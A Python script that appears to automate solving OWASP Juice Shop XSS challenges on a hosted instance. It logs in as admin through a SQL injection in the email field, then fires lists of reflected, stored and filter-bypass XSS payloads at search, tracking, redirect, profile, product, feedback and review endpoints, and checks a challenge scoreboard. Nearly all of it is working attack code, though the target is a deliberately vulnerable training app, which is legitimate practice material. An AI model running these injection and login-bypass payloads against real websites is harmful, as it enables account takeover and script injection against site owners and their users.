#!/usr/bin/env python3
"""
Reflected XSS Solver - Try the Reflected XSS challenge instead
Since DOM XSS isn't working, let's solve Reflected XSS
"""

import requests
from urllib.parse import quote
import json


def solve_reflected_xss():
    """Solve the Reflected XSS challenge"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🎯 REFLECTED XSS CHALLENGE SOLVER")
    print("="*60)
    
    # Login as admin first
    print("\n1️⃣ Logging in as admin...")
    r = session.post(f"{base_url}/rest/user/login", json={
        "email": "admin@juice-sh.op'--",
        "password": "x"
    })
    
    if r.status_code == 200:
        token = r.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("  ✅ Admin logged in")
    
    print("\n2️⃣ Testing Reflected XSS vectors...")
    
    # The reflected XSS is typically in the track order functionality
    # Try the order tracking page
    payloads = [
        "<iframe src=\"javascript:alert(`xss`)\">",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "');</script><script>alert(1)</script>",
        "<svg onload=alert(1)>"
    ]
    
    # Try track result endpoint
    print("\n  Testing /track-result endpoint...")
    for payload in payloads:
        url = f"{base_url}/track-result?id={quote(payload)}"
        r = session.get(url)
        print(f"    Payload: {payload[:30]}... -> Status: {r.status_code}")
        
        # Check if reflected
        if payload in r.text:
            print(f"    ✅ Payload reflected in response!")
    
    # Try the redirect endpoint
    print("\n  Testing /redirect endpoint...")
    for payload in payloads:
        url = f"{base_url}/redirect?to={quote(payload)}"
        r = session.get(url, allow_redirects=False)
        print(f"    Payload: {payload[:30]}... -> Status: {r.status_code}")
    
    # Try profile endpoint
    print("\n  Testing /profile endpoint...")
    for payload in payloads:
        r = session.post(f"{base_url}/profile", json={
            "username": payload,
            "email": "test@test.com"
        })
        print(f"    Payload: {payload[:30]}... -> Status: {r.status_code}")
    
    print("\n3️⃣ Checking Reflected XSS challenge status...")
    
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        reflected_xss = [c for c in data if 'Reflected' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if reflected_xss:
            challenge = reflected_xss[0]
            if challenge.get('solved'):
                print(f"  ✅ Reflected XSS: SOLVED!")
            else:
                print(f"  ❌ Reflected XSS: Not solved")
        
        # Check overall progress
        solved = [c for c in data if c.get('solved')]
        print(f"\n📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")


def solve_api_xss():
    """Try API-only XSS challenge"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("\n" + "="*60)
    print("🎯 API-ONLY XSS CHALLENGE")
    print("="*60)
    
    # Login first
    r = session.post(f"{base_url}/rest/user/login", json={
        "email": "admin@juice-sh.op'--",
        "password": "x"
    })
    
    if r.status_code == 200:
        token = r.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    print("\n1️⃣ Injecting XSS via API endpoints...")
    
    # Products API
    print("  Testing Products API...")
    r = session.post(f"{base_url}/api/Products", json={
        "name": "<script>alert(1)</script>",
        "description": "<img src=x onerror=alert(1)>",
        "price": 1.99,
        "image": "xss.jpg"
    })
    print(f"    Products: {r.status_code}")
    
    # Feedbacks API
    print("  Testing Feedbacks API...")
    r = session.post(f"{base_url}/api/Feedbacks", json={
        "comment": "<iframe src='javascript:alert(1)'>",
        "rating": 5,
        "UserId": 1
    })
    print(f"    Feedbacks: {r.status_code}")
    
    # Reviews API
    print("  Testing Reviews API...")
    r = session.post(f"{base_url}/api/Products/1/reviews", json={
        "message": "<svg onload=alert(1)>",
        "author": "xss@test.com"
    })
    print(f"    Reviews: {r.status_code}")
    
    print("\n2️⃣ Checking API-only XSS status...")
    
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        api_xss = [c for c in data if 'API' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if api_xss:
            challenge = api_xss[0]
            if challenge.get('solved'):
                print(f"  ✅ API-only XSS: SOLVED!")
            else:
                print(f"  ❌ API-only XSS: Not solved")


def try_client_xss_bypass():
    """Try Client-side XSS Protection bypass"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("\n" + "="*60)
    print("🎯 CLIENT-SIDE XSS PROTECTION BYPASS")
    print("="*60)
    
    print("\n1️⃣ Testing filter bypass techniques...")
    
    # Bypass payloads
    bypass_payloads = [
        # Case variations
        "<ScRiPt>alert(1)</ScRiPt>",
        "<sCrIpT>alert(1)</sCrIpT>",
        
        # Double tags
        "<<SCRIPT>alert(1)//<</SCRIPT>",
        
        # Encoding tricks
        "<script >alert(1)</script >",
        "<script\t>alert(1)</script>",
        
        # Alternative tags
        "<img src=x onerror=alert(1)//",
        "<svg/onload=alert(1)>",
        
        # Break filters
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        
        # Unicode
        "<script>alert\u0028 1\u0029</script>",
        
        # Null bytes
        "<script>alert%001</script>",
    ]
    
    for payload in bypass_payloads:
        url = f"{base_url}/#/search?q={quote(payload)}"
        r = session.get(url)
        print(f"  Payload: {payload[:30]}... -> {r.status_code}")
    
    print("\n2️⃣ Checking Client-side XSS Protection status...")
    
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        client_xss = [c for c in data if 'Client' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if client_xss:
            challenge = client_xss[0]
            if challenge.get('solved'):
                print(f"  ✅ Client-side XSS Protection: SOLVED!")
            else:
                print(f"  ❌ Client-side XSS Protection: Not solved")


def main():
    """Main execution"""
    print("\n🚀 XSS CHALLENGES SOLVER")
    print("="*60)
    print("Since DOM XSS isn't triggering, let's solve other XSS challenges")
    
    # Try different XSS challenges
    solve_reflected_xss()
    solve_api_xss()
    try_client_xss_bypass()
    
    print("\n" + "="*60)
    print("📊 FINAL STATUS")
    print("="*60)
    
    session = requests.Session()
    r = session.get("https://juice3.wonkatech.org/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        solved = [c for c in data if c.get('solved')]
        
        print(f"\n📊 Overall Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        print(f"📌 Need {55-len(solved)} more for 50%")
        
        # Show all XSS challenges status
        xss_challenges = [c for c in data if 'XSS' in c.get('name', '')]
        print(f"\n🎯 XSS Challenges Status:")
        for c in xss_challenges:
            status = "✅" if c.get('solved') else "❌"
            print(f"  {status} {c.get('name')} (Level {c.get('difficulty')})")
    
    print("\n💡 For DOM XSS:")
    print("The challenge appears to require browser-side execution.")
    print("Try opening Chrome DevTools Console (F12) and running:")
    print('  location.href = "/#/search?q=<iframe src=\'javascript:alert(`xss`)\'>"')


if __name__ == "__main__":
    main()